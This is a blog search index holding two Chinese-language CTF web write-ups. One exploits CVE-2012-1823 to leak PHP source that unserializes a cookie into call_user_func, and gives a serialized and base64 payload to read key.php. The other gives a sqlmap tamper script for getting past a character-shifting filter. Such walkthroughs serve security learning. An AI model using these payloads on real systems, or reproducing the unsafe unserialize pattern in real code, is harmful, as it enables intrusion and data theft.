<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php-cgi之获取源码</title>
      <link href="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/"/>
      <url>/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="php-cgi之获取源码"><a href="#php-cgi之获取源码" class="headerlink" title="php-cgi之获取源码"></a>php-cgi之获取源码</h1><p>　　<strong>知识点：信息泄露、cve-2012-1823，代码审计</strong></p><p>　　‍</p><p>　　右键源代码</p><p><img src="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213556-7vaqw5a.png" alt="image">​</p><p><img src="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213700-soj7wti.png" alt="image">​</p><p>　　<img src="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213707-mxw1q48.png" alt="image"></p><p>　　‍</p><p>　　发现在main.php下的提示</p><p>　　<img src="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213732-8pgsog7.png" alt="image"></p><p>　　关于cve-2012-1823，我们参考<a href="https://www.freebuf.com/articles/web/213647.html">https://www.freebuf.com/articles/web/213647.html</a></p><p>　　<img src="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110214051-kxmt684.png" alt="image"></p><p>　　‍</p><p>　　可知通过-s可以获取源码<img src="/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110214341-zooynws.png" alt="image"></p><p>　　尝试了上述文章中的其他利用方式无法成功，那么利用点就是在泄露的源码内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(<span class="string">&#x27;install.file.lock&#x27;</span>)) &#123;</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_GET</span>) || !empty(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;&#123;<span class="variable">$parts</span>[&#x27;host&#x27;]&#125;:&#123;<span class="variable">$parts</span>[&#x27;port&#x27;]&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>]) &amp;&amp; !empty(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$key</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line"><span class="keyword">function</span> get_contents(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="variable">$key</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$key</span>[<span class="string">&#x27;main&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>　　审计源码，发现只需要令REFERER和host相同即可进入下面的判断，那么接下来我们只需要构造一串序列化，令func&#x3D;get_contents，main&#x3D;key.php</p><p>　　即可令程序执行call_user_func(“get_contents”,”key.php”);  从而获取到key</p><p>　　下面就是构造出的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">&quot;func&quot;</span>;s:12:<span class="string">&quot;get_contents&quot;</span>;s:4:<span class="string">&quot;main&quot;</span>;s:7:<span class="string">&quot;key.php&quot;</span>;&#125;</span><br><span class="line">YToyOntzOjQ6ImZ1bmMiO3M6MTI6ImdldF9jb250ZW50cyI7czo0OiJtYWluIjtzOjc6ImtleS5waHAiO30=</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> cve-2012-1823 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入之编写sqlmap-tamper脚本实现绕过</title>
      <link href="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/"/>
      <url>/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入之编写sqlmap-tamper脚本实现绕过"><a href="#sql注入之编写sqlmap-tamper脚本实现绕过" class="headerlink" title="sql注入之编写sqlmap-tamper脚本实现绕过"></a>sql注入之编写sqlmap-tamper脚本实现绕过</h1><p>　　<strong>知识点：sql注入漏洞，脚本编写</strong></p><p>　　‍</p><p>　　根据题目提示已知是sql注入，一开始用单引号什么的测试发现不太对劲，后来发现输入的字符与报错返回的字符不一样，右键查看一下源代码，发现输入code的字符会经过这个validate函数</p><p>　　<img src="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134533-rx6bbfa.png" alt="image">​</p><p>　　<img src="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134322-5xtywse.png" alt="image"><img src="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134403-nrweirs.png" alt="image">​</p><p>　　<img src="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134350-z1or6ui.png" alt="image"></p><p>　　然后根据题目的混淆函数，</p><p>　　编写sqlmap tamper脚本，然后交给sqlmap跑就ok了（懒狗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"> </span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="comment"># Initialize an empty string to store the result</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment"># Iterate through each character in the string</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="comment"># Shift the ASCII value of the character by -1</span></span><br><span class="line">            c_shifted = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># Append the shifted character to the result</span></span><br><span class="line">            result += c_shifted</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>　　<img src="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110140915-o6yy5j9.png" alt="image">​</p><p>　　<img src="/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110140927-o0kuzdh.png" alt="image">​</p><p>　　‍</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入漏洞 </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
